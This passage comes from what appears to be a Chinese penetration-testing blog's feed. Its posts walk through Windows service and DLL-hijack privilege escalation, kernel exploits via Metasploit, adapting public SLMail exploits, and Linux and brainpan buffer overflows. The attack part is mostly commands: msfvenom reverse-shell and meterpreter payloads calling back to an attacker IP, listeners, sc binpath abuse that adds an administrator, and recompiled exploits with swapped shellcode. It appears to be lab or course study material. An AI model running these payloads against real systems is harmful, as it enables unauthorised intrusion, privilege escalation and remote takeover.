class="hljs code-wrapper"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> localgroup groupname username /add<br><span class="hljs-built_in">net</span> localgroup groupname username /delete<br></code></pre></div></td></tr></table></figure><h2 id="切换用户权限"><a href="#切换用户权限" class="headerlink" title="切换用户权限"></a>切换用户权限</h2><h3 id="普通用户cmd切换到管理员"><a href="#普通用户cmd切换到管理员" class="headerlink" title="普通用户cmd切换到管理员"></a>普通用户cmd切换到管理员</h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">runas <span class="hljs-regexp">/noprofile /u</span>ser:Administrator cmd<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows服务提权&amp;dll劫持</title>
    <link href="/2020/02/13/12-x/"/>
    <url>/2020/02/13/12-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：</p><ul><li><a href="https://www.cnblogs.com/bmjoker/p/11031238.html">dll劫持</a></li><li><a href="https://blog.csdn.net/jiangqin115/article/details/46531099">sc.exe windows 服务管理</a></li><li><a href="https://www.youtube.com/watch?v=9s8jYwx9FSA&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=3">youtube视频</a></li></ul><p>制作了一个youtube<a href="https://www.youtube.com/watch?v=wlq2FqkN0GA">视频</a>，下面是用到的一些命令。</p><p>sc是一个管理主机服务的工具</p><p>查看一个服务的运行状态 ，sc query 服务名</p><p>查看一个服务的配置信息 ，sc qc 服务名</p><p>【windows】</p><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">whoami<br><br>C:\Program Files\DLL Hijack Service\dllhijackservice.exe<br><br>进程监视器<br>dllhijackservice.exe<br>过滤<br><span class="hljs-section">NAME NOT FOUND</span><br><span class="hljs-section">---</span><br>sc qc dllsvc<br>sc start dllsvc<br></code></pre></div></td></tr></table></figure><p>【kali】<br>修改windows_dll.c<br><code>cmd.exe /k net localgroup administrators user /add</code></p><p>编译<br><code>x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll</code></p><p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -o hijackme.dll</code></p><p><code>handler -H 192.168.1.100 -P 4444 -p windows/x64/meterpreter/reverse_tcp</code></p><p>【windows】<br>将<code>hijackme.dll</code>复制到地址<code>C:\Temp</code></p><p>运行命令<code>sc stop dllsvc &amp; sc start dllsvc</code></p>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>binpath本地提权</title>
    <link href="/2020/02/13/10-x/"/>
    <url>/2020/02/13/10-x/</url>
    
    <content type="html"><![CDATA[<p>binpath本地提权是利用了服务权限不正确。在youtube上传了一个演示<a href="https://youtu.be/ZfMKsf5Sv-8">视频</a></p><p>参考资料：<a href="https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_windows.html">https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_windows.html</a></p><p>上一篇提到过，sc.exe是一个管理windows服务的命令。</p><h2 id="检查服务配置的权限是否不安全"><a href="#检查服务配置的权限是否不安全" class="headerlink" title="检查服务配置的权限是否不安全"></a>检查服务配置的权限是否不安全</h2><p><code>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc</code></p><p><code>“SERVICE_CHANGE_CONFIG” permission.</code><br>任何用户都有修改配置的权限</p><p><code>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe /accepteula -uwcqv 用户名 *</code><br>查看用户可以有权修改哪些服务。</p><h2 id="修改服务配置"><a href="#修改服务配置" class="headerlink" title="修改服务配置"></a>修改服务配置</h2><p>使用sc命令</p><p>下面命令的意思是配置一个exe，作为服务启动。<br><code>sc config NewService binpath= &quot;ntsd -d c:\windows\system32\NewServ.exe&quot;</code></p><p>sc create whale2dll binpath= “C:\Program Files\DLL Hijack Service\dllhijackservice.exe” type= own</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">配置名称为daclsvc的服务，<br><span class="hljs-keyword">sc </span><span class="hljs-built_in">config</span> daclsvc <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;net localgroup administrators user /add&quot;</span><br><span class="hljs-keyword">sc </span>start daclsvc<br>net localgroup administrators<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows内核提权</title>
    <link href="/2020/02/11/03-x/"/>
    <url>/2020/02/11/03-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：</p><ul><li><a href="https://github.com/sagishahar/lpeworkshop">github项目lpeworkshop</a></li><li><a href="https://www.youtube.com/watch?v=HTM-BavQvs4&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=1">youtubu视频</a></li></ul><p>【windows】</p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">powershell -nop -ep bypass<br>Import-Module C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\w</span>hale<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\T</span>ools<span class="hljs-symbol">\S</span>herlock<span class="hljs-symbol">\S</span>herlock.ps1<br>Find-AllVulns<br></code></pre></div></td></tr></table></figure><p>【kali】</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">msfconsole</span><br><span class="hljs-attribute">handler</span> -H <span class="hljs-number">192.168.1.100</span> -P <span class="hljs-number">4444</span> -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp<br><br><span class="hljs-attribute">msfvenom</span> -p windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168.1.100</span> LPORT=<span class="hljs-number">4444</span> -f exe -o payload.exe<br></code></pre></div></td></tr></table></figure><p>【windows】<br>拷贝payload.exe并运行</p><p>【kali】</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">sessions -i 1<br><span class="hljs-builtin-name">run</span> migrate -n explorer.exe<br>getuid  【win-u8oiu3qm15c\whale】<br>background<br>use exploit/windows/local/ms14_058_track_popup_menu<br>show options<br><span class="hljs-builtin-name">set</span> session 1<br>show target<br><span class="hljs-builtin-name">set</span> target 1<br><span class="hljs-builtin-name">set</span> payload generic/shell_reverse_tcp<br><span class="hljs-builtin-name">set</span> lhost 192.168.1.100<br><span class="hljs-builtin-name">set</span> lport 4455<br><span class="hljs-builtin-name">run</span><br>whoami<br></code></pre></div></td></tr></table></figure><p>在b站上传了<a href="https://www.bilibili.com/video/av88180824/">演示视频</a></p>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>查找与修改exp</title>
    <link href="/2020/02/07/09-x/"/>
    <url>/2020/02/07/09-x/</url>
    
    <content type="html"><![CDATA[<h2 id="本地查找exp"><a href="#本地查找exp" class="headerlink" title="本地查找exp"></a>本地查找exp</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> slmail<br><br><span class="hljs-attribute">locate</span> /<span class="hljs-number">643</span>.c<br></code></pre></div></td></tr></table></figure><h2 id="互联网上查找exp"><a href="#互联网上查找exp" class="headerlink" title="互联网上查找exp"></a>互联网上查找exp</h2><p>可靠的经过验证的公开exp来源：</p><ul><li><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li><li><a href="https://www.securityfocus.com/">https://www.securityfocus.com/</a></li></ul><h2 id="exp-debug"><a href="#exp-debug" class="headerlink" title="exp debug"></a>exp debug</h2><p>由于软件版本等问题，exp可能会执行不成功。</p><p>要搭建对应的操作系统版本和有漏洞的软件，作为目标环境，来测试exp。测试exp能够成功执行以后，再在目标上运行。</p><p>通常，公开exp的shellcode并不能直接使用。shellcode可能会弹出计算器、绑定无效的IP反弹shell。</p><p>如果漏洞对buffer size不敏感，那么就可以将shellcode直接替换为我们的。如果漏洞对于缓冲区大小很敏感，那么简单的替换shellcode，可能会导致漏洞利用失败。</p><p>在更复杂的情况下，比如说exp要绕过DEP和ASLR溢出保护，那么替换shellcode的方式更起不到效果。</p><h2 id="exp修改案例"><a href="#exp修改案例" class="headerlink" title="exp修改案例"></a>exp修改案例</h2><p>mingw是一个跨平台编译器，可以将这个代码编译为windows PE 可执行格式，使用wine在kali上运行。</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> install mingw-w64<br><br>dpkg --add-architecture i386 &amp;&amp; apt-<span class="hljs-builtin-name">get</span> update <br>apt-<span class="hljs-builtin-name">get</span> install wine:i386<br><br></code></pre></div></td></tr></table></figure><ul><li>目标ip: 192.168.1.101</li><li>kali ip: 192.168.1.100</li></ul><h3 id="编译643-c"><a href="#编译643-c" class="headerlink" title="编译643.c"></a>编译643.c</h3><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">searchsploit</span> <span class="hljs-string">slmail</span><br><span class="hljs-string">locate</span> <span class="hljs-string">/643.c</span><br><span class="hljs-string">cp</span> <span class="hljs-string">/usr/share/exploitdb/exploits/windows/remote/643.c</span> <span class="hljs-string">.</span><br><span class="hljs-string">该c代码有错误，无法正确编译</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">wget</span> <span class="hljs-string">https://raw.githubusercontent.com/sevro/security-utilities/master/c/slmail_linux/643-fixed.c</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-string">将c代码中的shellcode替换一下，生成适合我们目标ip的shellcode：</span><br><span class="hljs-string">msfvenom</span> <span class="hljs-string">-p</span> <span class="hljs-string">windows/shell_reverse_tcp</span> <span class="hljs-string">LHOST=192.168.1.100</span> <span class="hljs-string">LPORT=443</span> <span class="hljs-string">-f</span> <span class="hljs-string">c</span> <span class="hljs-string">–e</span> <span class="hljs-string">x86/shikata_ga_nai</span> <span class="hljs-string">-b</span> <span class="hljs-string">&quot;\x00\x0a\x0d&quot;</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-string">目标ip替换一下：</span><br>    <span class="hljs-string">xs</span> <span class="hljs-string">=</span> <span class="hljs-string">conn(&quot;192.168.1.101&quot;);</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">编译：</span><br><br><span class="hljs-string">gcc</span> <span class="hljs-number">643</span><span class="hljs-string">-fixed.c</span> <span class="hljs-string">-o</span> <span class="hljs-string">exp</span><br><span class="hljs-string">chmod</span> <span class="hljs-string">+x</span> <span class="hljs-string">exp</span><br><br><span class="hljs-string">nc</span> <span class="hljs-string">-lnvp</span> <span class="hljs-number">443</span><br><span class="hljs-string">./exp</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-07-09/10.PNG" alt="10"></p><h3 id="编译646-c"><a href="#编译646-c" class="headerlink" title="编译646.c"></a>编译646.c</h3><p><a href="https://raw.githubusercontent.com/sevro/security-utilities/master/c/slmail_windows/646-fixed.c">https://raw.githubusercontent.com/sevro/security-utilities/master/c/slmail_windows/646-fixed.c</a></p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">wget</span> <span class="hljs-string">https://raw.githubusercontent.com/sevro/security-utilities/master/c/slmail_windows/646-fixed.c</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">修改exp的shellcode</span><br><span class="hljs-string">msfvenom</span> <span class="hljs-string">-p</span> <span class="hljs-string">windows/shell_reverse_tcp</span> <span class="hljs-string">LHOST=192.168.1.100</span> <span class="hljs-string">LPORT=4444</span> <span class="hljs-string">-f</span> <span class="hljs-string">c</span> <span class="hljs-string">–e</span> <span class="hljs-string">x86/shikata_ga_nai</span> <span class="hljs-string">-b</span> <span class="hljs-string">&quot;\x00\x0a\x0d&quot;</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">编译</span><br><span class="hljs-string">i686-w64-mingw32-gcc</span> <span class="hljs-number">646</span><span class="hljs-string">-fixed.c</span> <span class="hljs-string">-lws2_32</span> <span class="hljs-string">-o</span> <span class="hljs-number">646.</span><span class="hljs-string">exe</span><br><br><span class="hljs-comment">#i686-w64-mingw32-gcc是编译win32位exe的编译器</span><br><span class="hljs-comment">#x86_64-w64-mingw32-gcc是编译win64位exe的编译器</span><br><span class="hljs-comment">#经过测试，kali是64位的，只有x86_64-w64-mingw32-gcc编译的64位exe，能够成功获得windows shell.</span><br><br><span class="hljs-string">i686-w64-mingw32-gcc</span> <span class="hljs-number">646</span><span class="hljs-string">-fixed.c</span> <span class="hljs-string">-lws2_32</span> <span class="hljs-string">-o</span> <span class="hljs-number">646.</span><span class="hljs-string">exe</span><br><br><span class="hljs-string">x86_64-w64-mingw32-gcc</span> <span class="hljs-number">646</span><span class="hljs-string">-fixed.c</span> <span class="hljs-string">-lws2_32</span> <span class="hljs-string">-o</span> <span class="hljs-number">646.</span><span class="hljs-string">exe</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">运行</span><br><span class="hljs-string">wine</span> <span class="hljs-number">646.</span><span class="hljs-string">exe</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.101</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-07-09/11.PNG" alt="11"></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>crossfire&amp;linux缓冲区溢出案例（四）</title>
    <link href="/2020/02/05/09-x/"/>
    <url>/2020/02/05/09-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：<a href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">linux程序的常用保护机制</a></p><p>上一篇：<a href="https://whale3070.github.io/buffer%20overflow/2020/01/28/12-x/">crossfire&amp;linux缓冲区溢出案例（三）</a></p><h2 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h2><p>上一篇找到了这些坏字符，在生成shellcode的时候必须避免这些字符出现<code>\x00\x09\x0a\x20</code></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[目标主机ip-linux]</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">67.128</span><br><span class="hljs-selector-attr">[攻击机ip]</span>         <span class="hljs-number">192.168</span>.<span class="hljs-number">67.1</span><br><br>msfvenom -<span class="hljs-selector-tag">p</span> linux/x86/shell_bind_tcp LPORT=<span class="hljs-number">4444</span> -f c -<span class="hljs-selector-tag">b</span><br><span class="hljs-string">&quot;\x00\x09\x0a\x20&quot;</span> –e x86/shikata_ga_nai<br><br>msfvenom -<span class="hljs-selector-tag">p</span> linux/x86/shell_bind_tcp LPORT=<span class="hljs-number">4444</span> -f python -<span class="hljs-selector-tag">b</span> <span class="hljs-string">&quot;\x00\x09\x0a\x20&quot;</span> –e x86/shikata_ga_nai<br></code></pre></div></td></tr></table></figure><h2 id="寻找返回地址"><a href="#寻找返回地址" class="headerlink" title="寻找返回地址"></a>寻找返回地址</h2><p>现在我们知道要到达ESP寄存器指向的缓冲区，我们需要找到一条指令，例如<code>JMP ESP</code>，它将把我们带到ESP寄存器指向的地址。 </p><h3 id="edb"><a href="#edb" class="headerlink" title="edb"></a>edb</h3><p>Evans Debugger具有简单的操作码搜索功能。ctrl + o 快捷键搜索操作码</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">[目标机执行bof程序]edb --run <span class="hljs-regexp">/usr/g</span>ames<span class="hljs-regexp">/crossfire/</span>bin/crossfire<br></code></pre></div></td></tr></table></figure><p>但是经过搜索，没有找到任何有效的跳转地址。怀疑是版本不是最新版，有bug，但是apt-get upgrade edb，报了错。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">The</span> following packages have unmet dependencies:<br> <span class="hljs-attribute">emacs</span>-common : Breaks: edb (&lt; <span class="hljs-number">1</span>.<span class="hljs-number">32</span>) but <span class="hljs-number">1</span>.<span class="hljs-number">31</span>-<span class="hljs-number">3</span> is to be installed<br><span class="hljs-attribute">E</span>: Broken packages<br></code></pre></div></td></tr></table></figure><p>放弃使用edb来查找跳转指令。</p><h3 id="msfelfscan"><a href="#msfelfscan" class="headerlink" title="msfelfscan"></a>msfelfscan</h3><p>如果运行msfelfscan提示命令未找到“ command not found” </p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>bin<br>ln -s <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/framework2/m</span>sfelfscan msfelfscan<br></code></pre></div></td></tr></table></figure><p>msfelfscan -j esp -f  /usr/games/crossfire/bin/crossfire</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-number">0x08134597</span>   <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">esp</span><br><span class="hljs-number">0x081345d7</span>   <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">esp</span><br><span class="hljs-number">0x08134727</span>   <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">esp</span><br><span class="hljs-number">0x081349c7</span>   <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">esp</span><br><span class="hljs-number">0x08134ad7</span>   <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">esp</span><br><span class="hljs-number">0x08134f87</span>   <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">esp</span><br></code></pre></div></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">[攻击机执行命令] ./nc.<span class="hljs-keyword">exe</span> -lnvp <span class="hljs-number">4444</span><br>[攻击机] <span class="hljs-keyword">python</span> <span class="hljs-built_in">exp</span>.<span class="hljs-keyword">py</span><br></code></pre></div></td></tr></table></figure><p>这是exp在栈中的执行流程。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-09/1.png" alt="1"></p><h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p>经过一些失败的尝试，crossfire程序还是没有成功反弹shell。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-09/2.PNG" alt="2"></p><p>SIGSEGV是非法内存访问异常</p><p>同样的crossfire程序，同样的exp。在官方的给的虚拟机中可以成功溢出获得shell，但是在自己的x64位linux上不能。</p><p><a href="https://img.offensive-security.com/pwk-kali-vm.7z">官方给的靶机地址: pwk-kali-vm.7z</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-09/4.PNG" alt="4"></p><p>github上有人问了同样的<a href="https://github.com/eteran/edb-debugger/issues/724">问题</a>，但是没有答案或者解决方案</p><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-09/3.PNG" alt="3"></p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">RELRO           <span class="hljs-keyword">STACK</span> CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  <span class="hljs-keyword">FILE</span><br><span class="hljs-keyword">No</span> RELRO        <span class="hljs-keyword">No</span> canary found   NX enabled    <span class="hljs-keyword">No</span> PIE          <span class="hljs-keyword">No</span> RPATH   <span class="hljs-keyword">No</span> RUNPATH   2262 Symbols     <span class="hljs-keyword">No</span>     0               18      crossfire<br><br>RELRO: <span class="hljs-keyword">read</span> only relocation 尽量减少可写的存储区域<br><span class="hljs-keyword">STACK</span> CANARY ：栈保护<br>NX 将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令<br>PIE 地址空间分布随机化<br>RPATH  <br>RUNPATH     <br>Symbols        <br>FORTIFY Fortified       检查是否存在缓冲区溢出的错误<br>Fortifiable  <span class="hljs-keyword">FILE</span><br></code></pre></div></td></tr></table></figure><h2 id="运行crossfire的虚拟机"><a href="#运行crossfire的虚拟机" class="headerlink" title="运行crossfire的虚拟机"></a>运行crossfire的虚拟机</h2><p>未成功的机器A：<br><code>Linux kali 5.4.0-kali3-686-pae #1 SMP Debian 5.4.13-1kali1 (2020-01-20) i686 GNU/Linux</code></p><p>成功的虚拟机B：<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-09/5.PNG" alt="5"></p><p>B机器检查“地址空间分布随机化”后，发现是开启状态，可以确定运行失败的原因跟这个无关。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>randomize_va_space<br><span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05-09/6.PNG" alt="6"><br>在成功弹shell一次后，再次运行机器B的exp，溢出就无法成功了。</p><p>重启后，运行exp，就能成功弹shell。</p><p>推测是因为溢出改变了某个内存机制？知识的匮乏导致无法继续分析。</p>]]></content>
    
    
    <categories>
      
      <category>buffer overflow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>buffer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>brainpan（栈溢出）</title>
    <link href="/2020/01/30/04-x/"/>
    <url>/2020/01/30/04-x/</url>
    
    <content type="html"><![CDATA[<p>题外话：人生其实很简单，想要的就去争取，得到了就珍惜，失去了就忘记。</p><p>192.168.67.130</p><figure class="highlight vhdl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vhdl"><span class="hljs-keyword">PORT</span>      STATE SERVICE<br><span class="hljs-number">9999</span>/tcp  <span class="hljs-keyword">open</span>  abyss <br><span class="hljs-number">10000</span>/tcp <span class="hljs-keyword">open</span>  snet-sensor-mgmt<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-04/3.PNG" alt="3"><br><code>http://192.168.67.130:10000</code></p><p><code>nc 192.168.67.130 9999</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-04/14.PNG" alt="14"></p><p>根据nc连接结果来看，brainpan.exe就是9999端口上运行的程序。<br>但是我们不知道密码，于是要通过逆向来获取。</p><h2 id="brainpan-exe"><a href="#brainpan-exe" class="headerlink" title="brainpan.exe"></a>brainpan.exe</h2><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">file</span> brainpan.<span class="hljs-keyword">exe</span> <br>brainpan.<span class="hljs-keyword">exe</span>: PE32 <span class="hljs-built_in">executable</span> (console) Intel <span class="hljs-number">80386</span> (stripped <span class="hljs-keyword">to</span> external PDB), <span class="hljs-keyword">for</span> MS Windows<br></code></pre></div></td></tr></table></figure><p>windows 32位程序</p><h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><p>strings brainpan.exe</p><p>查看程序的字符串，确认该程序就是目标主机9999端口运行的。</p><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>本地windows机器做目标机，kali做攻击机。对程序进行动态调试。</p><p>windows主机，用调试器打开该程序<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-04/1.PNG" alt="1"></p><p>kali连接windows主机的9999端口<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-30-04/2.PNG" alt="2"></p><h3 id="demo-py让程序报错"><a href="#demo-py让程序报错" class="headerlink" title="demo.py让程序报错"></a>demo.py让程序报错</h3><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python</span><br>import socket<br><br>host = <span class="hljs-string">&quot;192.168.67.1&quot;</span><br><br>buffer = <span class="hljs-string">&quot;A&quot;</span><span 